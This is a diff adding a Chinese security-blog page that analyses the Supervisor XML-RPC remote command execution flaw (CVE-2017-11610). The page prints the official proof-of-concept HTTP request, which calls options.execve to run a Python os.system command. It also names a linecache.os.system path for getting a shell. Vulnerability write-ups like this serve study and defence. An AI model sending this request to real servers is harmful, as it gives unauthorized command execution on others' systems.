@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    supervisorRCE漏洞
+  
+</title>
+
+<meta name="description" content="​     Supervisor RCE​    supervisor 任意命令执行 CVE-2017-11610。">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="supervisorRCE漏洞">
+<meta property="og:url" content="http://spikesec.cn/2017/08/20/supervisorRCE漏洞/index.html">
+<meta property="og:site_name" content="Spike Security">
+<meta property="og:description" content="​     Supervisor RCE​    supervisor 任意命令执行 CVE-2017-11610。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://spikesec.cn/2017/08/20/supervisorRCE漏洞/supervisorRCE漏洞/packet.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/20/supervisorRCE漏洞/supervisorRCE漏洞/code1.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/20/supervisorRCE漏洞/supervisorRCE漏洞/code2.jpg">
+<meta property="og:updated_time" content="2018-03-01T08:13:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="supervisorRCE漏洞">
+<meta name="twitter:description" content="​     Supervisor RCE​    supervisor 任意命令执行 CVE-2017-11610。">
+<meta name="twitter:image" content="http://spikesec.cn/2017/08/20/supervisorRCE漏洞/supervisorRCE漏洞/packet.jpg">
+
+
+  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Spike Security</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Spike Security</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">Spike</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-supervisorRCE漏洞" class="article article-type-post">
+  
+    <h1 class="article-header">
+      supervisorRCE漏洞
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2017-08-20
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <p>​    </p>
+<h1 id="Supervisor-RCE"><a href="#Supervisor-RCE" class="headerlink" title="Supervisor RCE"></a>Supervisor RCE</h1><p>​    supervisor 任意命令执行 CVE-2017-11610。</p>
+<a id="more"></a>
+<p>​    Supervisor 是一个Linux系统管理的工具，曾经在比赛的时候用过管理后台进程。所以这个洞看起来很可能会派上用场。</p>
+<p>​    Supervisor分为Server和Client端，并通过RPC协议提供了远程管理的功能，这次的漏洞就是在远程管理的过程中没有限制好Python的函数引用范围，导致可以调用其他目录下面的可以命令执行的方法。客户端在远程调用服务端的方法时，是使用RPC协议进行通信。</p>
+<p>​    <img src="supervisorRCE漏洞\packet.jpg" alt="packet"></p>
+<p>​    http协议的内容是XML协议，XML中的节点表示调用函数的方法和调用函数的参数。</p>
+<p>​    下面来看服务器端处理函数的方法：</p>
+<p><img src="supervisorRCE漏洞\code1.jpg" alt="code1"></p>
+<p><img src="supervisorRCE漏洞\code2.jpg" alt="code2"></p>
+<p>​    只要调用中的对象都不以下划线<code>_</code>开头，则会遍历数组将ob中的name对象赋值给ob，循环作词动作直到数组末尾。由此导致在ob的初始对象<code>self.rpcinterface</code>下面的所有Public方法都可以被调用，这也是问题的来源。</p>
+<p>​    最初漏洞的发现着找到了<code>self.rpcinterface.supervisor.supervisord.options</code>下的<code>execve</code>方法，这个方法具有直接执行命令的权利。通过调用这类方法，我们都可以实现任意命令执行的目的。</p>
+<p>​    官方POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /RPC2 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 439</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;supervisor.supervisord.options.execve&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;string&gt;/usr/local/bin/python&lt;/string&gt;</span><br><span class="line">&lt;/param&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">&lt;value&gt;&lt;string&gt;python&lt;/string&gt;&lt;/value&gt;</span><br><span class="line">&lt;value&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/value&gt;</span><br><span class="line">&lt;value&gt;&lt;string&gt;import os;os.system(&apos;touch /tmp/success&apos;);&lt;/string&gt;&lt;/value&gt;</span><br><span class="line">&lt;/data&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;/param&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;struct&gt;</span><br><span class="line">&lt;/struct&gt;</span><br><span class="line">&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
+<p>​    下面是P师傅的方法（再次膜一下P师傅，原文链接在下面）：</p>
+<p>​    由于直接调用方法<code>os.execve</code>原进程会被新的进程取代，当这个新的进程结束后，整个程序就退出了。所以如果要保持持久的利用连接，那么就需要先fock一个进程，这样主程序就不会退出。</p>
+<p>​    还有可以利用其他方法调用命令执行的函数，<code>supervisor.supervisord.options.warnings.linecache.os.system</code>,这种方法也可以直接getshell，上面用的就是这个例子。</p>
+<p>​    参考：</p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-96316" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-96316</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html</a></p>
+<p><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="noopener">http://liyangliang.me/posts/2015/06/using-supervisor/</a></p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
